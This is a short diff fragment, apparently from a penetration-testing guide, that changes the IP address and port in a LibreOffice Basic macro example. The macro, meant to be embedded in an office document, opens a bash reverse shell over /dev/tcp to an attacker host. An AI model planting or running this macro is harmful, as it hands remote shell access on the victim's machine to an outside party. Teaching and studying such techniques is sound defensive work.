@@ -483,7 +483,7 @@ We can create a macro and embed it into a LibreOffice file, like Microsoft Excel
 REM  *****  BASIC  *****
 
 Sub Main
-    Shell("bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'")
+    Shell("bash -c 'bash -i >& /dev/tcp/192.168.45.204/8295 0>&1'")
 End Sub
 ```
 
